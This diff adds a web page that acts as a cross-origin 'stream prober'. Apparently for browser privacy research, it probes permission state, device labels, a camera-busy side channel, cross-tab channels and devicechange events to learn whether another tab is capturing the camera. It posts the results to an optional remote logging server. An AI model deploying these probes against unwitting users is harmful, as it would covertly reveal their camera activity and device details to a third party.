@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Origin B — Stream Prober</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#0d1117;color:#c9d1d9;padding:14px;font-size:14px}
+.card{background:#161b22;border:1px solid #30363d;border-radius:12px;padding:16px;max-width:640px;margin:0 auto 12px}
+h2{font-size:16px;color:#58a6ff;margin-bottom:4px}
+h3{font-size:11px;text-transform:uppercase;letter-spacing:.05em;color:#8b949e;margin:14px 0 6px}
+.sub{font-size:11px;color:#8b949e;line-height:1.5;margin-bottom:10px}
+button{width:100%;border:none;border-radius:8px;padding:10px;font-size:13px;font-weight:600;color:#fff;background:#1f6feb;margin-top:8px}
+button.alt{background:#30363d}
+.row{display:flex;gap:8px;font-size:12px;padding:5px 0;border-bottom:1px solid #21262d;align-items:baseline}
+.row b{min-width:190px;color:#8b949e;font-weight:500;flex-shrink:0}
+.row span{font-family:ui-monospace,monospace;word-break:break-all}
+.leak{color:#ff7b72;font-weight:650}.safe{color:#7ee787}.warn{color:#e3b341}
+.verdict{border-radius:8px;padding:12px;margin:10px 0;font-weight:650;text-align:center;font-size:13px;line-height:1.45}
+.v-leak{background:#2d1214;color:#ff7b72}.v-none{background:#0f5323;color:#7ee787}.v-wait{background:#21262d;color:#8b949e}
+input{width:100%;background:#0d1117;border:1px solid #30363d;color:#c9d1d9;border-radius:8px;padding:8px;font-size:12px;font-family:ui-monospace,monospace;margin-bottom:8px}
+code{background:#21262d;padding:2px 5px;border-radius:4px;font-size:.85em}
+</style>
+</head>
+<body>
+<div class="card">
+  <h2>Origin B — Stream Prober</h2>
+  <p class="sub">Run in a <b>second tab</b> (ideally a <b>different origin</b>) while the holder page
+  keeps a stream live. Tests what B can learn about — or take from — A's active capture.
+  <br><br>This origin: <code id="org"></code></p>
+  <input id="srv" placeholder="oracle server .../log (optional)">
+  <div class="verdict v-wait" id="verdict">idle</div>
+  <button onclick="runAll()">Run full probe battery</button>
+  <button class="alt" onclick="watchDeviceChange()">Watch devicechange events (30s)</button>
+  <div id="out"></div>
+</div>
+<script>
+document.getElementById('org').textContent = location.origin;
+const Q = new URLSearchParams(location.search);
+const safeLS = k => { try { return localStorage.getItem(k); } catch(e){ return null; } };
+let SRV = Q.get('srv') || safeLS('oracle_srv') || '';
+document.getElementById('srv').value = SRV;
+document.getElementById('srv').onchange = e => { SRV = e.target.value.replace(/\/$/,'');
+  try{ localStorage.setItem('oracle_srv', SRV); }catch(_){} };
+
+const R = { origin: location.origin, probes: {}, leaks: [] };
+function sec(t){ const h=document.createElement('h3'); h.textContent=t; document.getElementById('out').appendChild(h); }
+function row(k,v,cls){ const d=document.createElement('div'); d.className='row';
+  const b=document.createElement('b'); b.textContent=k;
+  const s=document.createElement('span'); s.textContent=String(v); if(cls) s.className=cls;
+  d.appendChild(b); d.appendChild(s); document.getElementById('out').appendChild(d); }
+function leak(id, text){ R.leaks.push({id,text}); }
+async function post(type,data){ if(!SRV) return;
+  try{ await fetch(SRV+'?type='+type,{method:'POST',
+    headers:{'Content-Type':'application/json','ngrok-skip-browser-warning':'true'},
+    body:JSON.stringify({...data,_ts:Date.now(),ua:navigator.userAgent,href:location.href})});}catch(e){} }
+
+async function runAll(){
+  document.getElementById('out').innerHTML='';
+  R.probes = {}; R.leaks = [];
+
+  // ---- P1: does B see a permission it never asked for?
+  sec('P1 · permission state visible to B');
+  for (const n of ['camera','microphone']) {
+    let st='?'; try { st=(await navigator.permissions.query({name:n})).state; }catch(e){ st='unsupported'; }
+    R.probes['perm_'+n]=st;
+    row(`permissions.query(${n})`, st, st==='granted'?'leak':'safe');
+    if (st==='granted') leak('P1','B sees '+n+' as granted without having requested it');
+  }
+
+  // ---- P2: device labels — exposed only when granted, so they are an oracle
+  sec('P2 · device label exposure');
+  try {
+    const d = await navigator.mediaDevices.enumerateDevices();
+    const lab = d.filter(x=>x.label);
+    R.probes.deviceCount=d.length; R.probes.labelled=lab.length;
+    row('devices', d.length);
+    row('labelled', lab.length, lab.length? 'leak':'safe');
+    if (lab.length) { leak('P2','device labels exposed to B'); lab.slice(0,4).forEach(x=>row('  label', `${x.kind}: ${x.label}`,'leak')); }
+  } catch(e){ row('enumerateDevices', 'error '+e.name); }
+
+  // ---- P3: THE SIDE CHANNEL — is the camera busy because A holds it?
+  //        Many platforms make the camera exclusive; the error name/timing differs
+  //        between "denied", "absent" and "in use by another origin".
+  sec('P3 · camera-busy side channel (does B learn A is capturing?)');
+  const t0=Date.now();
+  try {
+    const s = await navigator.mediaDevices.getUserMedia({video:true});
+    const ms=Date.now()-t0;
+    R.probes.gum={granted:true, ms};
+    row('getUserMedia', `GRANTED in ${ms}ms`, 'leak');
+    leak('P3','B obtained camera while A holds it — concurrent access, or B inherited a grant');
+    s.getTracks().forEach(t=>t.stop());
+  } catch(e){
+    const ms=Date.now()-t0;
+    R.probes.gum={granted:false, error:e.name, message:e.message, ms};
+    row('getUserMedia', `${e.name} in ${ms}ms`, e.name==='NotReadableError'?'leak':'warn');
+    row('  message', e.message);
+    if (e.name==='NotReadableError' || /in use|busy|Could not start/i.test(e.message||''))
+      leak('P3','NotReadableError / busy — this DISCLOSES that another origin is currently using the camera. Cross-origin state leak without any grant.');
+  }
+
+  // ---- P4: cross-tab channels (same-origin only by spec — verify)
+  sec('P4 · cross-tab channels reachable from B');
+  R.probes.bcMessages=[];
+  try {
+    const bc=new BroadcastChannel('media-state');
+    bc.onmessage=ev=>{ R.probes.bcMessages.push(ev.data);
+      row('BroadcastChannel RX', JSON.stringify(ev.data).slice(0,90), 'leak');
+      leak('P4','B received A\'s media-state over BroadcastChannel'); };
+    row('BroadcastChannel', 'listening (same-origin only by spec)','warn');
+  } catch(e){ row('BroadcastChannel','unavailable'); }
+  const ls = safeLS('media_state');
+  row('localStorage media_state', ls || '(none)', ls?'leak':'safe');
+  if (ls) leak('P4','A\'s state readable via shared localStorage — same-origin only, so this indicates B is same-origin');
+
+  // ---- P5: transferable MediaStreamTrack — can a handle cross a boundary?
+  sec('P5 · MediaStreamTrack transferability');
+  R.probes.trackTransferable = (()=>{ try {
+      const c=document.createElement('canvas'); c.width=c.height=2;
+      const t=c.captureStream(1).getVideoTracks()[0];
+      structuredClone(t,{transfer:[t]}); return true;
+    } catch(e){ return 'no — '+e.name; } })();
+  row('track transferable', R.probes.trackTransferable, R.probes.trackTransferable===true?'warn':'safe');
+  if (R.probes.trackTransferable===true)
+    row('note','tracks are transferable here — test whether one can be postMessage\'d to a cross-origin frame','warn');
+
+  // ---- P6: capture-surface reach
+  sec('P6 · display capture reach');
+  R.probes.getDisplayMedia = !!(navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia);
+  row('getDisplayMedia present', R.probes.getDisplayMedia, R.probes.getDisplayMedia?'warn':'safe');
+
+  const v=document.getElementById('verdict');
+  if (R.leaks.length===0){ v.className='verdict v-none'; v.textContent='No cross-origin leakage detected from B.'; }
+  else { v.className='verdict v-leak';
+    v.innerHTML = `${R.leaks.length} LEAK(S):<br>` + R.leaks.map(l=>`${l.id} — ${l.text}`).join('<br>'); }
+  post('STREAM_PROBE', R);
+}
+
+function watchDeviceChange(){
+  sec('devicechange watch (30s)');
+  let n=0;
+  const h=()=>{ n++; row(`devicechange #${n}`, new Date().toTimeString().slice(0,8), 'leak');
+    leak('P7','devicechange fired in B — device-set changes in another origin are observable here'); };
+  navigator.mediaDevices.addEventListener('devicechange', h);
+  row('watching','start/stop a stream in the holder tab now','warn');
+  setTimeout(()=>{ navigator.mediaDevices.removeEventListener('devicechange', h);
+    row('watch ended', `${n} event(s)`); post('STREAM_PROBE_DEVICECHANGE',{events:n, origin:location.origin}); }, 30000);
+}
+</script>
+</body>
+</html>
